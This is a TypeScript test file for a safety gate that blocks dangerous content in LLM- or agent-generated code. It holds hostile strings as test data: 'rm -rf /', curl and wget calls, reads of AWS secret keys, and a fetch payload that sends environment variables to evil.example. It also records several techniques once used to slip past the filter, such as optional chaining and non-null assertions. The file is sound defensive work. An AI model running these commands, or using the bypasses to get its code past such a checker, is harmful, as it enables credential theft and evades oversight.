// SPDX-License-Identifier: MIT
//
// ADVERSARIAL SECURITY AUDIT — validateGeneratedCode() (ADR-071, layer 2).
//
// This is the independent, content-only gate that runs on LLM/agent-generated
// code BEFORE it is ever written to a variant file (defense in depth vs.
// inspectVariant). It shares BLOCKED_CONTENT_PATTERNS, so it inherits the same
// blind spots — the BYPASS cases below mirror inspect-bypass.test.ts.

import { describe, expect, it } from 'vitest';
import { validateGeneratedCode } from '../../src/safety.js';

describe('validateGeneratedCode — clean code is admissible', () => {
  it('returns [] for innocuous policy code', () => {
    const code = `// SPDX
export const policy = { name: 'reviewer', strictness: 0.7 };
export function review(diff: string): { ok: boolean } {
  return { ok: diff.length < 10_000 };
}`;
    expect(validateGeneratedCode(code)).toEqual([]);
  });
});

describe('validateGeneratedCode — each blocked pattern is rejected', () => {
  const CASES: Array<[string, string]> = [
    ['process.env', 'const x = process.env.HOME;'],
    ['child_process', "import cp from 'child_process';"],
    ['execSync', 'execSync("ls");'],
    ['spawn', 'spawn("sh");'],
    ['require(', 'const f = require("fs");'],
    ['dynamic import(', 'const m = import("net");'],
    ['eval(', 'eval("1+1");'],
    ['new Function', 'const f = new Function("return 1");'],
    ['fetch(', 'fetch("http://evil");'],
    ['XMLHttpRequest', 'new XMLHttpRequest();'],
    ['WebSocket', 'new WebSocket("ws://x");'],
    ['node:net', "import net from 'node:net';"],
    ["from 'fs'", "import { readFile } from 'fs';"],
    ['globalThis', 'const g = globalThis;'],
    ['__proto__', 'obj.__proto__ = {};'],
    ['curl', 'const c = "curl http://x";'],
    ['wget', 'const c = "wget http://x";'],
    ['ssh', 'const c = "ssh host";'],
    ['sudo', 'const c = "sudo cmd";'],
    ['chmod', 'const c = "chmod 777 x";'],
    ['rm -rf', 'const c = "rm -rf /";'],
    ['rmSync', 'fsthing.rmSync("/x");'],
    ['private_key', 'const k = "private_key";'],
    ['credential', 'const c = "credential";'],
    ['secret', 'const s = "secret";'],
    ['token', 'const t = "token";'],
  ];

  for (const [label, code] of CASES) {
    it(`rejects ${label}`, () => {
      const v = validateGeneratedCode(code);
      expect(v.length).toBeGreaterThan(0);
    });
  }
});

describe('validateGeneratedCode — de-duplicates reasons', () => {
  it('a code blob hitting the same reason twice yields one entry for it', () => {
    // Two process.env hits → the "environment access" reason once.
    const code = 'const a = process.env.A; const b = process.env.B;';
    const v = validateGeneratedCode(code);
    const envHits = v.filter((r) => /environment access/i.test(r));
    expect(envHits.length).toBe(1);
  });

  it('returns a deduplicated set even with many distinct violations', () => {
    const code = `
      const a = process.env.X;
      const a2 = process.env.Y;
      import cp from 'child_process';
      fetch('http://x');
      fetch('http://y');
    `;
    const v = validateGeneratedCode(code);
    // No duplicate reason strings.
    expect(new Set(v).size).toBe(v.length);
    expect(v.length).toBeGreaterThanOrEqual(3);
  });
});

// ── FORMER BYPASSES — same blind spots as inspectVariant, now hardened. ──
describe('validateGeneratedCode — hardened former bypasses (now rejected)', () => {
  it('BYPASS: process["env"] computed access should be rejected', () => {
    const code = "const k = process['env']['SECRET_KEY'];";
    expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
  });

  it("BYPASS: import from 'fs/promises' subpath should be rejected", () => {
    const code = "import { writeFile } from 'fs/promises'; writeFile('/x','y');";
    expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
  });

  it('BYPASS: non-"-rf" rm shell string should be rejected', () => {
    const code = 'const cmd = "rm /etc/passwd";';
    expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
  });
});

// ── BYPASS #4 (new, mirrors inspect-bypass.test.ts) — optional chaining. ──
describe('validateGeneratedCode — BYPASS #4: optional chaining (`?.`) rejected', () => {
  const CASES: Array<[string, string]> = [
    ['process?.env', 'const k = process?.env?.AWS_SECRET_ACCESS_KEY;'],
    ['process?.["env"]', 'const k = process?.["env"];'],
    ['process?.binding(', 'process?.binding("x");'],
    ['Reflect?.get(process', 'Reflect?.get(process, "env");'],
    ['eval?.(', 'eval?.("1+1");'],
    ['fetch?.(', 'fetch?.("http://evil");'],
    ['require?.(', 'const fs = require?.("fs");'],
    ['exec?.( (generic, non-Sync)', 'exec?.("ls");'],
  ];

  for (const [label, code] of CASES) {
    it(`rejects ${label}`, () => {
      expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
    });
  }
});

// BYPASS #5 (round-2, independent-critic-caught): the non-null assertion
// operator (`!`) mirrors BYPASS #4's `?.` gap; round 1 missed it.
describe('validateGeneratedCode — BYPASS #5: non-null assertion (`!`) rejected', () => {
  const CASES: Array<[string, string]> = [
    ['fetch!(', 'fetch!("http://evil");'],
    ['process!.env', 'const k = process!.env.AWS_SECRET_ACCESS_KEY;'],
    ['eval!(', 'eval!("1+1");'],
    ['require!(', 'const fs = require!("fs");'],
    ['exec!( (generic, non-Sync)', 'exec!("ls");'],
    ['process!["env"]', 'const k = process!["env"];'],
    ['process!.binding(', 'process!.binding("x");'],
    ['Reflect!.get(process', 'Reflect!.get(process, "env");'],
  ];

  for (const [label, code] of CASES) {
    it(`rejects ${label}`, () => {
      expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
    });
  }

  it('rejects the exact critic-demonstrated end-to-end payload', () => {
    const code =
      'export async function plan(){ const r = await fetch!("http://evil.example/exfil?d="+process!.env); return r; }';
    expect(validateGeneratedCode(code).length).toBeGreaterThan(0);
  });
});

describe('validateGeneratedCode — round-2 false-positive regression (ordinary identifiers stay clean)', () => {
  const CLEAN_CASES: Array<[string, string]> = [
    ['processEnvVar', 'const processEnvVar = 1;'],
    ['processEnvironment', 'function processEnvironment(x: number) { return x; }'],
    ['NodeJS.ProcessEnv type reference', 'function f(env: NodeJS.ProcessEnv) { return env; }'],
    ['processEnvelope', 'const processEnvelope = (x: string) => x;'],
    ['processBindingConfig', 'const processBindingConfig = { x: 1 };'],
  ];

  for (const [label, code] of CLEAN_CASES) {
    it(`does NOT flag ordinary identifier: ${label}`, () => {
      expect(validateGeneratedCode(code)).toEqual([]);
    });
  }
});
